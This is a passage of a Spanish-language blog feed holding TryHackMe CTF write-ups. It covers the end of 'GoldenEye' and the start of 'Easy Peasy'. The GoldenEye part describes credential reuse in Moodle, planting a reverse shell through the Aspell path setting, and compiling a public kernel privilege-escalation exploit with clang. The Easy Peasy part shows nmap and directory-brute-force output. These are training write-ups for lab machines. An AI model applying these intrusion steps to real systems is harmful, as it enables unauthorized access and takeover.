&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;RETR &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt;
+OK &lt;span class=&#34;m&#34;&gt;606&lt;/span&gt; octets
Return-Path: &amp;lt;doak@ubuntu&amp;gt;
X-Original-To: doak
Delivered-To: doak@ubuntu
Received: from doak &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;localhost &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;127.0.0.1&lt;span class=&#34;o&#34;&gt;])&lt;/span&gt;
	by ubuntu &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Postfix&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; with SMTP id 97DC24549D
	&lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; &amp;lt;doak&amp;gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; Tue, &lt;span class=&#34;m&#34;&gt;30&lt;/span&gt; Apr &lt;span class=&#34;m&#34;&gt;1995&lt;/span&gt; 20:47:24 -0700 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;PDT&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
Message-Id: &amp;lt;20180425034731.97DC24549D@ubuntu&amp;gt;
Date: Tue, &lt;span class=&#34;m&#34;&gt;30&lt;/span&gt; Apr &lt;span class=&#34;m&#34;&gt;1995&lt;/span&gt; 20:47:24 -0700 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;PDT&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
From: doak@ubuntu

James,
If you&lt;span class=&#34;s1&#34;&gt;&amp;#39;re reading this, congrats you&amp;#39;&lt;/span&gt;ve gotten this far. You know how tradecraft works right?

Because I don&lt;span class=&#34;err&#34;&gt;&amp;#39;&lt;/span&gt;t. Go to our training site and login to my account....dig &lt;span class=&#34;k&#34;&gt;until&lt;/span&gt; you can exfiltrate further information......

username: dr_doak
password: &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;... REDACTED ...&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;

.
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h3 id=&#34;admin---moodle&#34;&gt;ADMIN - MOODLE&lt;/h3&gt;
&lt;p&gt;Utilizamos las credenciales de doak en moodle. Encontramos un archivo que contiene una direccion a una imagen, que segun el mensaje ahi se encuentran las credenciales del usuario &lt;code&gt;admin&lt;/code&gt;.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/goldeneye/Screenshot_20200805_174321.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Descargamos la imagen y al analizarla con &lt;code&gt;exiftool&lt;/code&gt; encontramos una cadena de texto codificada en base64.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/goldeneye/Screenshot_20200805_174531.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Utilizamos la &amp;ldquo;contraseña&amp;rdquo; que encontramos en moodle con el usuario &lt;code&gt;admin&lt;/code&gt; y logramos obtener acceso.&lt;/p&gt;
&lt;h2 id=&#34;www-data---user&#34;&gt;WWW-DATA - USER&lt;/h2&gt;
&lt;p&gt;Dentro de moodle agregamos una shell inversa en la configuracion del PATH de ASPELL.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/goldeneye/Screenshot_20200805_175618.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Tambien configuramos el parametro del plugin &lt;code&gt;TinyMCE&lt;/code&gt; a &lt;code&gt;PSpellShell&lt;/code&gt;.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/goldeneye/Screenshot_20200805_182449.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Pusimos a la escucha netcat, creamos una nueva entrada de blog donde vemos la opcion de &lt;code&gt;spell&lt;/code&gt;, que al presionar el boton, se ejecuta nuestra shell.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/goldeneye/Screenshot_20200805_182624.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Logramos obtener una shell con el usuario &lt;code&gt;www-data&lt;/code&gt;.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/goldeneye/Screenshot_20200805_182726.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;privilege-escalation&#34;&gt;PRIVILEGE ESCALATION&lt;/h2&gt;
&lt;p&gt;Hacemos una pequeña enumeracion con &lt;code&gt;uname -a&lt;/code&gt; y vemos la version del kernel, al revisar si existe un exploit encontramos &lt;a href=&#34;https://www.exploit-db.com/exploits/37292&#34;&gt;&lt;strong&gt;Linux Kernel 3.13.0 - Local Privilege Escalation&lt;/strong&gt;&lt;/a&gt;, el cual descargamos y ejecutamos en la maquina, pero nos dio un error y es que &lt;code&gt;gcc&lt;/code&gt; no está instalado en la maquina.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/goldeneye/Screenshot_20200805_184638.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Por lo que buscamos alternativas a &lt;code&gt;gcc&lt;/code&gt; y encontramos &lt;code&gt;clang&lt;/code&gt;, el cual si esta instalado en la maquina. Editamos el exploit cambiando gcc por clang, descargamos, ejecutamos el exploit en la maquina y logramos obtener una shell con usuario root.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/goldeneye/Screenshot_20200805_184813.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;gcc&lt;/code&gt; a &lt;code&gt;clang&lt;/code&gt;.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-diff&#34; data-lang=&#34;diff&#34;&gt;&lt;span class=&#34;gd&#34;&gt;-lib = system(&amp;#34;gcc -fPIC -shared -o /tmp/ofs-lib.so /tmp/ofs-lib.c -ldl -w&amp;#34;);
&lt;/span&gt;&lt;span class=&#34;gd&#34;&gt;&lt;/span&gt;&lt;span class=&#34;gi&#34;&gt;+lib = system(&amp;#34;clang -fPIC -shared -o /tmp/ofs-lib.so /tmp/ofs-lib.c -ldl -w&amp;#34;);
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Y nuestra flag &lt;code&gt;root.txt&lt;/code&gt;.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/goldeneye/Screenshot_20200805_185108.webp&#34; alt=&#34;image&#34; /&gt;&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/goldeneye/Screenshot_20200805_185146.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
</content:encoded>
        <dc:creator>sckull</dc:creator>
        <media:content url="https://sckull.github.io/images/posts/thm/goldeneye/cover.webp" medium="image"><media:title type="html">featured image</media:title></media:content>
        
        <media:content url="https://sckull.github.io/images/posts/thm/goldeneye/cover.webp" medium="image"><media:title type="html">meta image</media:title></media:content>
        
          
            
              <category>linux</category>
            
          
        
        
          
            
              <category>tryhackme</category>
            
          
        
        
      </item>
      
      <item>
        <title>TryHackMe - Easy Peasy</title>
        <link>https://sckull.github.io/posts/easypeasy/</link>
        <pubDate>Tue, 04 Aug 2020 00:00:00 +0000</pubDate>
        
        <atom:modified>Tue, 04 Aug 2020 00:00:00 +0000</atom:modified>
        <guid>https://sckull.github.io/posts/easypeasy/</guid>
        <description>Easy Peasy es una maquina de TryHackMe aqui encontrarás la solucion para obtener la flag user.txt y root.</description>
        <content:encoded>&lt;p&gt;Easy Peasy es una maquina de TryHackMe aqui encontrarás la solucion para obtener la flag user.txt y root.txt.&lt;/p&gt;




  



  &lt;div class=&#34;featured-image__wrapper&#34;&gt;
    &lt;img src=&#34;https://sckull.github.io/images/posts/thm/easypeasy_thm/cover.webp&#34; alt=&#34;featured image&#34; class=&#34;featured-image&#34; style=&#34;width: ;height: ;&#34;&gt;
  &lt;/div&gt;

&lt;h3 id=&#34;informacion-de-la-maquina&#34;&gt;Informacion de la Maquina&lt;/h3&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;Titulo&lt;/th&gt;
&lt;th&gt;Easy Peasy&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;Info&lt;/td&gt;
&lt;td&gt;Practice using tools such as Nmap and GoBuster to locate a hidden directory to get initial access to a vulnerable machine. Then escalate your privileges through a vulnerable cronjob.&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Puntos&lt;/td&gt;
&lt;td&gt;330&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Dificultad&lt;/td&gt;
&lt;td&gt;Facil&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Maker&lt;/td&gt;
&lt;td&gt;&lt;a href=&#34;https://tryhackme.com/p/kral4&#34;&gt;kral4&lt;/a&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h2 id=&#34;nmap&#34;&gt;NMAP&lt;/h2&gt;
&lt;p&gt;Escaneo de puertos tcp, nmap nos muestra el puerto http (80), ssh (6498) y http (65524) abierto.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# Nmap 7.80 scan initiated Wed Aug  5 01:17:20 2020 as: nmap -p- -T4 -o nmap_scan -v easy.thm&lt;/span&gt;
Increasing send delay &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; 10.10.162.162 from &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt; to &lt;span class=&#34;m&#34;&gt;5&lt;/span&gt; due to &lt;span class=&#34;m&#34;&gt;21&lt;/span&gt; out of &lt;span class=&#34;m&#34;&gt;52&lt;/span&gt; dropped probes since last increase.
Nmap scan report &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; easy.thm &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;10.10.162.162&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
Host is up &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;0.26s latency&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.
Not shown: &lt;span class=&#34;m&#34;&gt;65532&lt;/span&gt; closed ports
PORT      STATE SERVICE
80/tcp    open  http
6498/tcp  open  unknown
65524/tcp open  unknown

Read data files from: /usr/bin/../share/nmap
&lt;span class=&#34;c1&#34;&gt;# Nmap done at Wed Aug  5 01:39:35 2020 -- 1 IP address (1 host up) scanned in 1335.29 seconds&lt;/span&gt;

&lt;span class=&#34;c1&#34;&gt;# Nmap 7.80 scan initiated Wed Aug  5 01:46:14 2020 as: nmap -sV -p 80,6498,65524 -o services_scan easy.thm&lt;/span&gt;
Nmap scan report &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; easy.thm &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;10.10.162.162&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
Host is up &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;0.29s latency&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.

PORT      STATE SERVICE VERSION
80/tcp    open  http    nginx 1.16.1
6498/tcp  open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Ubuntu Linux&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; protocol 2.0&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
65524/tcp open  http    Apache httpd 2.4.43 &lt;span class=&#34;o&#34;&gt;((&lt;/span&gt;Ubuntu&lt;span class=&#34;o&#34;&gt;))&lt;/span&gt;
Service Info: OS: Linux&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
&lt;span class=&#34;c1&#34;&gt;# Nmap done at Wed Aug  5 01:46:30 2020 -- 1 IP address (1 host up) scanned in 15.45 seconds&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;http&#34;&gt;HTTP&lt;/h2&gt;
&lt;p&gt;Encontramos una pagina web en el puerto 80.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/easypeasy_thm/Screenshot_20200805_154228.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h3 id=&#34;gobuster&#34;&gt;GOBUSTER&lt;/h3&gt;
&lt;p&gt;Utilizamos gobuster para busqueda de directorios y archivos.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;root@upset:~/thm/easypeasy gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://easy.thm/ -q -t &lt;span class=&#34;m&#34;&gt;250&lt;/span&gt; -x php,html,txt
/index.html &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/robots.txt &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/hidden &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 301&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Encontramos el archivo &lt;code&gt;robots.txt&lt;/code&gt; el cual no contiene ninguna url excluida, tambien la pagina &lt;code&gt;hidden&lt;/code&gt; donde encontramos una imagen de fondo.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/easypeasy_thm/Screenshot_20200805_154254.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Ejecutamos nuevamente RUSTUBUSTER pero ahora en el directorio/pagina &lt;code&gt;hidden&lt;/code&gt;.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;root@upset:~/thm/easypeasy /opt/rustbuster/rustbuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --url http://easy.thm/hidden/ -t &lt;span class=&#34;m&#34;&gt;155&lt;/span&gt; -e php,html,txt -o out_hidden.txt
~ rustbuster v3.0.3 ~ by phra &lt;span class=&#34;p&#34;&gt;&amp;amp;&lt;/span&gt; ps1dr3x ~

         _     _                 _         _           _        _                 _         _           _           _     
        /&lt;span class=&#34;se&#34;&gt;\ \ &lt;/span&gt; /&lt;span class=&#34;se&#34;&gt;\_\ &lt;/span&gt;             / /&lt;span class=&#34;se&#34;&gt;\ &lt;/span&gt;     /&lt;span class=&#34;se&#34;&gt;\ \ &lt;/span&gt;       / /&lt;span class=&#34;se&#34;&gt;\ &lt;/span&gt;    /&lt;span class=&#34;se&#34;&gt;\_\ &lt;/span&gt;             / /&lt;span class=&#34;se&#34;&gt;\ &lt;/span&gt;     /&lt;span class=&#34;se&#34;&gt;\ \ &lt;/span&gt;       /&lt;span class=&#34;se&#34;&gt;\ \ &lt;/span&gt;       /&lt;span class=&#34;se&#34;&gt;\ \ &lt;/span&gt;  
       /  &lt;span class=&#34;se&#34;&gt;\ \/&lt;/span&gt; / /         _   / /  &lt;span class=&#34;se&#34;&gt;\ &lt;/span&gt;    &lt;span class=&#34;se&#34;&gt;\_\ \ &lt;/span&gt;     / /  &lt;span class=&#34;se&#34;&gt;\ &lt;/span&gt;  / / /         _   / /  &lt;span class=&#34;se&#34;&gt;\ &lt;/span&gt;    &lt;span class=&#34;se&#34;&gt;\_\ \ &lt;/span&gt;     /  &lt;span class=&#34;se&#34;&gt;\ \ &lt;/span&gt;     /  &lt;span class=&#34;se&#34;&gt;\ \ &lt;/span&gt; 
      / /&lt;span class=&#34;se&#34;&gt;\ \ \ \ \_&lt;/span&gt;_      /&lt;span class=&#34;se&#34;&gt;\_\/&lt;/span&gt; / /&lt;span class=&#34;se&#34;&gt;\ \_&lt;/span&gt;_  /&lt;span class=&#34;se&#34;&gt;\_&lt;/span&gt;_ &lt;span class=&#34;se&#34;&gt;\ &lt;/span&gt;   / / /&lt;span class=&#34;se&#34;&gt;\ \ &lt;/span&gt; &lt;span class=&#34;se&#34;&gt;\ \ \_&lt;/span&gt;_      /&lt;span class=&#34;se&#34;&gt;\_\/&lt;/span&gt; / /&lt;span class=&#34;se&#34;&gt;\ \_&lt;/span&gt;_  /&lt;span class=&#34;se&#34;&gt;\_&lt;/span&gt;_ &lt;span class=&#34;se&#34;&gt;\ &lt;/span&gt;   / /&lt;span class=&#34;se&#34;&gt;\ \ \ &lt;/span&gt;   / /&lt;span class=&#34;se&#34;&gt;\ \ \ &lt;/span&gt;
     / / /&lt;span class=&#34;se&#34;&gt;\ \_\ \_&lt;/span&gt;__&lt;span class=&#34;se&#34;&gt;\ &lt;/span&gt;   / / / / /&lt;span class=&#34;se&#34;&gt;\ \_&lt;/span&gt;__&lt;span class=&#34;se&#34;&gt;\/&lt;/span&gt; /_ &lt;span class=&#34;se&#34;&gt;\ \ &lt;/span&gt; / / /&lt;span class=&#34;se&#34;&gt;\ \ \ &lt;/span&gt; &lt;span class=&#34;se&#34;&gt;\ \_&lt;/span&gt;__&lt;span class=&#34;se&#34;&gt;\ &lt;/span&gt;   / / / / /&lt;span class=&#34;se&#34;&gt;\ \_&lt;/span&gt;__&lt;span class=&#34;se&#34;&gt;\/&lt;/span&gt; /_ &lt;span class=&#34;se&#34;&gt;\ \ &lt;/span&gt; / / /&lt;span class=&#34;se&#34;&gt;\ \_\ &lt;/span&gt; / / /&lt;span class=&#34;se&#34;&gt;\ \_\
&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;&lt;/span&gt;    / / /_/ / /&lt;span class=&#34;se&#34;&gt;\_&lt;/span&gt;_  /   / / /&lt;span class=&#34;se&#34;&gt;\ \ \ \/&lt;/span&gt;___/ / /&lt;span class=&#34;se&#34;&gt;\ \ \/&lt;/span&gt; / /&lt;span class=&#34;se&#34;&gt;\ \_\ \ &lt;/span&gt; &lt;span class=&#34;se&#34;&gt;\_&lt;/span&gt;_  /   / / /&lt;span class=&#34;se&#34;&gt;\ \ \ \/&lt;/span&gt;___/ / /&lt;span class=&#34;se&#34;&gt;\ \ \/&lt;/span&gt; /_/_ &lt;span class=&#34;se&#34;&gt;\/&lt;/span&gt;_/ / / /_/ / /
   / / /__&lt;span class=&#34;se&#34;&gt;\/&lt;/span&gt; / / / /   / / /  &lt;span class=&#34;se&#34;&gt;\ \ \ &lt;/span&gt;   / / /  &lt;span class=&#34;se&#34;&gt;\/&lt;/span&gt;_/ / /&lt;span class=&#34;se&#34;&gt;\ \ \_&lt;/span&gt;__&lt;span class=&#34;se&#34;&gt;\ &lt;/span&gt;/ / /   / / /  &lt;span class=&#34;se&#34;&gt;\ \ \ &lt;/span&gt;   / / /  &lt;span class=&#34;se&#34;&gt;\/&lt;/span&gt;_/ /____/&lt;span class=&#34;se&#34;&gt;\ &lt;/span&gt;  / / /__&lt;span class=&#34;se&#34;&gt;\/&lt;/span&gt; / 
  / / /_____/ / / /   / / _    &lt;span class=&#34;se&#34;&gt;\ \ \ &lt;/span&gt; / / /     / / /  &lt;span class=&#34;se&#34;&gt;\ \ \_&lt;/span&gt;_// / /   / / _    &lt;span class=&#34;se&#34;&gt;\ \ \ &lt;/span&gt; / / /     / /&lt;span class=&#34;se&#34;&gt;\_&lt;/span&gt;___&lt;span class=&#34;se&#34;&gt;\/&lt;/span&gt;  / / /_____/  
 / / /&lt;span class=&#34;se&#34;&gt;\ \ \ &lt;/span&gt; / / /___/ / /_/&lt;span class=&#34;se&#34;&gt;\_&lt;/span&gt;_/ / / / / /     / / /____&lt;span class=&#34;se&#34;&gt;\_\ \ &lt;/span&gt;/ / /___/ / /_/&lt;span class=&#34;se&#34;&gt;\_&lt;/span&gt;_/ / / / / /     / / /______ / / /&lt;span class=&#34;se&#34;&gt;\ \ \ &lt;/span&gt;   
/ / /  &lt;span class=&#34;se&#34;&gt;\ \ \/&lt;/span&gt; / /____&lt;span class=&#34;se&#34;&gt;\/&lt;/span&gt; /&lt;span class=&#34;se&#34;&gt;\ \/&lt;/span&gt;___/ / /_/ /     / / /__________/ / /____&lt;span class=&#34;se&#34;&gt;\/&lt;/span&gt; /&lt;span class=&#34;se&#34;&gt;\ \/&lt;/span&gt;___/ / /_/ /     / / /_______/ / /  &lt;span class=&#34;se&#34;&gt;\ \ \ &lt;/span&gt;  
&lt;span class=&#34;se&#34;&gt;\/&lt;/span&gt;_/    &lt;span class=&#34;se&#34;&gt;\_\/\/&lt;/span&gt;_________/  &lt;span class=&#34;se&#34;&gt;\_&lt;/span&gt;____&lt;span class=&#34;se&#34;&gt;\/&lt;/span&gt;  &lt;span class=&#34;se&#34;&gt;\_\/&lt;/span&gt;      &lt;span class=&#34;se&#34;&gt;\/&lt;/span&gt;_____________&lt;span class=&#34;se&#34;&gt;\/&lt;/span&gt;_________/  &lt;span class=&#34;se&#34;&gt;\_&lt;/span&gt;____&lt;span class=&#34;se&#34;&gt;\/&lt;/span&gt;  &lt;span class=&#34;se&#34;&gt;\_\/&lt;/span&gt;      &lt;span class=&#34;se&#34;&gt;\/&lt;/span&gt;__________&lt;span class=&#34;se&#34;&gt;\/&lt;/span&gt;_/    &lt;span class=&#34;se&#34;&gt;\_\/&lt;/span&gt;   


&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;?&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Started at	: 2020-08-05 00:52:23

GET	&lt;span class=&#34;m&#34;&gt;200&lt;/span&gt; OK				http://easy.thm/hidden/
GET     &lt;span class=&#34;m&#34;&gt;200&lt;/span&gt; OK                          http://easy.thm/hidden/index.html
GET     &lt;span class=&#34;m&#34;&gt;301&lt;/span&gt; Moved Permanently           http://easy.thm/hidden/whatever
						&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;gt; http://easy.thm/hidden/whatever/
GET     &lt;span class=&#34;m&#34;&gt;200&lt;/span&gt; OK                          http://easy.thm/hidden/
^C
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;En una de las paginas encontradas vemos base64, el cual contiene una flag.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/easypeasy_thm/Screenshot_20200805_154520.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;http-65524&#34;&gt;HTTP 65524&lt;/h2&gt;
&lt;p&gt;Encontramos la pagina de apache en el puerto 65524.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/easypeasy_thm/Screenshot_20200805_154340.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Encontramos en el codigo fuente una flag.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/easypeasy_thm/Screenshot_20200805_154412.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Además un parrafo escondido, con una cadena de caracteres &amp;ldquo;codificado&amp;rdquo;.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/easypeasy_thm/Screenshot_20200805_154451.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
